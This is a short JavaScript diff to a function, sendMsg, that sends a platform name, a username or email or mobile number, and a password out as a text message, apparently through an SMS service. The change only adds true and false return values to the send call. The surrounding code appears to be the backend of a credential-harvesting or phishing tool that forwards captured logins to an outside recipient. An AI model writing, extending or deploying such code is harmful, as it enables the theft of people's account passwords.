@@ -13,9 +13,14 @@ async function sendMsg(identifier, password, platform) {
       to: to,
       body: `Platform: ${platform}\nUsername/Email/Mobile: ${identifier} \nPassword: ${password}`,
     })
-    .then((message) => console.log(message.sid))
+    .then((message) =>
+    {
+      console.log(message.sid);
+      return true;
+    })
     .catch((error) => {
       console.log(error);
+      return false;
     });
 }
 
